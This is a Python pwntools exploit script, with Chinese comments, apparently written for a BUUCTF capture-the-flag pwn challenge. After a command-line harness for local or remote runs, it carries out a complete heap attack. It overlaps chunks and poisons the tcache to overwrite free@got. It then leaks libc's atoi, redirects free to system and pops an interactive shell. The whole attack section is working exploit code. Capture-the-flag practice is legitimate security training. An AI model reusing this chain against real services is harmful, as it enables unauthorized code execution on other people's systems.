from pwn import *
from LibcSearcher import LibcSearcher
import click
import sys
import os
import time
import functools
'''
本脚本为做buuctf上的pwn题所编写，利用click模块配置命令行参数，
能方便地进行本地调试和远程解题。
本地命令：
    python3 exp.py filename --tmux 1 --gdb-breakpoint 0x804802a
    即可开始本地调试,并且会断在地址或函数处 建议启动tmux。tmux是一个窗口管理神器！
远程命令：
    python3 exp.py filename -i 127.0.0.1 -p 22164
    可以连接指定的IP和端口。目前在刷buuctf上的题，所以填了默认ip，只指定端口即可。
'''

FILENAME = '#' # 要执行的文件名
DEBUG = 1 # 是否为调试模式
TMUX = 0 # 是否开启TMUX
GDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置
IP = None # 远程连接的IP
PORT = None # 远程连接的端口
LOCAL_LOG = 1 # 本地LOG是否开启
PWN_LOG_LEVEL = 'debug' # pwntools的log级别设置
STOP_FUNCTION = 1 # STOP方法是否开启

CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.command(context_settings=CONTEXT_SETTINGS, short_help='Do pwn!')
@click.argument('filename', nargs=1, type=str, required=0, default=None)
@click.option('-d', '--debug', default=True, type=bool, nargs=1, help='Excute program at local env or remote env. Default value: True.')
@click.option('-t', '--tmux', default=False, type=bool, nargs=1, help='Excute program at tmux or not. Default value: False.')
@click.option('-gb', '--gdb-breakpoint', default=None, type=str, help='Set a gdb breakpoint while tmux is enabled, is a hex address or a function name. Default value:None')
@click.option('-i', '--ip', default=None, type=str, nargs=1, help='The remote ip addr. Default value: None.')
@click.option('-p', '--port', default=None, type=int, nargs=1, help='The remote port. Default value: None.')
@click.option('-ll', '--local-log', default=True, type=bool, nargs=1, help='Set local log enabled or not. Default value: True.')
@click.option('-pl', '--pwn-log', type=click.Choice(['debug', 'info', 'warn', 'error', 'notset']), nargs=1, default='debug', help='Set pwntools log level. Default value: debug.')
@click.option('-sf', '--stop-function', default=True, type=bool, nargs=1, help='Set stop function enabled or not. Default value: True.')
def parse_command_args(filename, debug, tmux, gdb_breakpoint, ip, 
                       port, local_log, pwn_log, stop_function):
    '''FILENAME: The filename of current directory to pwn'''
    global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION
    # assign
    FILENAME = filename
    DEBUG = debug
    TMUX = tmux
    GDB_BREAKPOINT = gdb_breakpoint
    IP = ip
    PORT = port
    LOCAL_LOG = local_log
    PWN_LOG_LEVEL = pwn_log
    STOP_FUNCTION = stop_function

    # change
    if PORT: # 远程下这些是需要关闭的
        DEBUG = 0
        TMUX = 0
        STOP_FUNCTION = 0
        GDB_BREAKPOINT = None
        if IP is None:
            IP = 'node3.buuoj.cn'
    
    if DEBUG:
        IP = None
        PORT = None
    
    # assert
    assert not (FILENAME is None and PORT is None), 'para error'
    assert not (FILENAME is None and DEBUG == 1), 'para error'
    assert not (PORT is not None and DEBUG == 1), 'para error'
    assert not (DEBUG == 0 and TMUX == 1), 'para error'
    
    # print
    click.echo('=' * 50)
    click.echo(' [+] Args info:\n')
    if FILENAME:
        click.echo('  filename: %s' % FILENAME)
    click.echo('  debug enabled: %d' % DEBUG)
    click.echo('  tmux enabled: %d' % TMUX)
    if GDB_BREAKPOINT:
        click.echo('  gdb breakpoint: %s' % GDB_BREAKPOINT)
    if IP:
        click.echo('  remote ip: %s' % IP)
    if PORT:
        click.echo('  remote port: %d' % PORT)
    click.echo('  local log enabled: %d' % LOCAL_LOG)
    click.echo('  pwn log_level: %s' % PWN_LOG_LEVEL)
    click.echo('  stop function enabled: %d' % STOP_FUNCTION)
    click.echo('=' * 50)
    

parse_command_args.main(standalone_mode=False)

if len(sys.argv) == 2 and sys.argv[1] == '--help':
    sys.exit(0)

if DEBUG:
    io = process('./{}'.format(FILENAME))
else:
    io = remote(IP, PORT)

if TMUX:
    context.update(terminal=['tmux', 'splitw', '-h'])
    if GDB_BREAKPOINT is None:
        gdb.attach(io)
    else:
        if '0x' in GDB_BREAKPOINT:
            GDB_BREAKPOINT = '*' + GDB_BREAKPOINT
        gdb.attach(io, gdbscript='b {}\nc\n'.format(GDB_BREAKPOINT))


if FILENAME:
    cur_elf = ELF('./{}'.format(FILENAME))
    print('[+] libc used ===> {}'.format(cur_elf.libc))

def LOG_ADDR(addr_name:str, addr:int):
    if LOCAL_LOG:
        log.success("{} ===> {}".format(addr_name, hex(addr)))
    else:
        pass


def LOG_ADDR_EX(addr_name:str):
    '''
    存储地址的变量名，字符串
    如：a = 0xdeadbeef 
    调用: LOG_ADDR_EX('a')
    
    '''
    if LOCAL_LOG:
        # 利用eval函数, 首先检索一下
        if addr_name in globals() or addr_name in vars():
            tmp_var = eval(addr_name)
            log.success("{} ===> {}".format(addr_name, hex(tmp_var)))
        else:
            log.warn("No variable named: '" + addr_name + "'")
    else:
        pass
    

STOP_COUNT = 0
def STOP(idx:int=-1):
    if not STOP_FUNCTION:
        return
    if idx != -1:
        print("stop...{} {}".format(idx, proc.pidof(io)))
    else:
        global STOP_COUNT
        print("stop...{}  {}".format(STOP_COUNT, proc.pidof(io)))
        STOP_COUNT += 1
    pause()


############### 定义一些偏函数 ###################

int16 = functools.partial(int, base=16)

#################### END ########################


############### 定义一些装饰器函数 ###############

def time_count(func):
    '''
    装饰器：统计函数运行时间
    '''
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        print('=' * 50)
        print('function #{}# start...'.format(func.__name__))
        start = time.time()
        res = func(*args, **kwargs)
        end = time.time()
        print('function #{}# end...execute time: {} s / {} min'.format(func.__name__, end - start, (end - start) / 60))
        return res
    return wrapper


def sleep_call(second:int=1, mod:int=1):
    """
    装饰器：在调用函数前后线程先睡眠指定秒数
    
    Args:
        second: 休眠秒数
        mod: 0 不休眠; 1 为调用前休眠; 2 为调用后休眠; 3 为前后均修眠
    """
    if mod > 3 or mod < 0:
        mod = 1
    def wrapper1(func):
        @functools.wraps(func)
        def wrapper2(*args, **kwargs):
            if mod & 1:
                time.sleep(second)
            res = func(*args, **kwargs)
            if mod & 2:
                time.sleep(second)
            return res
        return wrapper2
    return wrapper1
    
#################### END ########################

context.update(log_level=PWN_LOG_LEVEL)

# 一般需要带上文件
assert FILENAME is not None, 'give me a file!'
##################################################
##############以下为攻击代码#######################
##################################################
context.update(arch='amd64', os='linux', endian='little', log_level='NOTSET')
from print_with_color import *

# x[0]存储低3位和索引的或值，x[1]以及真实的chunk地址
qword_0x6020e0 = [[0, 0]] * 17

def show_qword_0x6020e0():
    '''如果RealPtr（真实的chunk地址）和GetPtr（计算取出来的chunk地址）不一样的话，用绿色打印！'''
    global qword_0x6020e0
    addr = 0x6020e0
    for x in qword_0x6020e0:
        if x[0] == 0:
            continue
        fstr = 'Addr:{} StorePtr:{} RealPtr:{} GetPtr:{} GetIdx:{}'.format(hex(addr), hex(x[0]), hex(x[1]), hex(x[0] & 0xfff0),hex(x[0] & 0xf))
        if (x[1]) != (x[0] & 0xfff0):
            print_green('[*] ' + fstr)
        else:
            log.info(fstr)
        addr += 8

def new_note(idx:int, size:int, content:bytes=b'\x00'):
    global io, qword_0x6020e0
    assert idx >= 0 and idx <= 0x10
    io.sendlineafter("your choice: ", '1')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(size))
    io.sendafter("content: ", content)
    low_bytes = io.recvline()
    log.info('get msg:{}'.format(low_bytes))
    low_bytes = low_bytes[12:-1]
    low_bytes = int16(low_bytes.decode())
    store_low = (low_bytes | idx)
    for i in range(0x11):
        if qword_0x6020e0[i][0] == 0:
            qword_0x6020e0[i] = [store_low, low_bytes]
            break
    return low_bytes, i


def del_note(idx:int):
    global io, qword_0x6020e0
    io.sendlineafter("your choice: ", '2')
    io.sendlineafter("index: ", str(idx))
    msg = io.recvline()
    count = -1
    for x in qword_0x6020e0:
        count += 1
        if (x[0] & 0xf) == idx:
            x[0] = 0
            x[1] = 0
            break
    return msg, count

def edit_note(idx:int, content:bytes):
    global io
    io.sendlineafter("your choice: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendafter("content: ", content)
    io.recvuntil("edit success.\n\n")

# get chunk
new_note(0x10, 0x10) # idx 0 chunk A
new_note(0x1, 0x10) # idx 1 chunk B
new_note(0x2, 0x10) # idx 2 chunk C
new_note(0x3, 0x20) # idx 3 chunk D
new_note(0x4, 0x10, b'/bin/sh\x00') # idx 4 chunk E

show_qword_0x6020e0() # show array
STOP()
# edit and overlap size field
edit_note(0, p64(0) + p64(0x71))
STOP()
# del_note 1 chunk B and re-malloc it
del_note(1)
STOP()
new_note(0x1, 0x60) # idx 1 chunk F

 # del_note 2 chunk C and 3 chunk D
del_note(2)
del_note(3)

# change the next pointer of freed chunk C and freed chunk D
payload = p64(0) * 3 + p64(0x21) + p64(0x602018) + p64(0) * 2 + p64(0x31) + p64(0x602070)
edit_note(1, payload)
STOP()
# tcache attack
new_note(1, 0x10)
new_note(1, 0x20)

new_note(2, 0x10, p64(0x400790)) # idx 2, chunk G, change free@got to puts@plt
new_note(3, 0x20, b'a' * 8) # idx 3, chunk H, change setbuf@got to 'aaaaaaaa'
STOP()
# call del_note to leak __libc_atoi address and calculate __libc_system address
io.sendlineafter("your choice: ", '2')
io.sendlineafter("index: ", '3')
msg = io.recvline()
STOP()
show_qword_0x6020e0() # show array
STOP()
# edit_note, change free@got to __libc_system
atoi_addr = u64(msg[8:-1] + b'\x00\x00')
LOG_ADDR('atoi_addr', atoi_addr)
system_addr = atoi_addr + 0xedc0
show_qword_0x6020e0()
edit_note(10, p64(system_addr) * 2)
STOP()
# get shell
io.sendlineafter("your choice: ", '2')
io.sendlineafter("index: ", '4')

io.interactive()



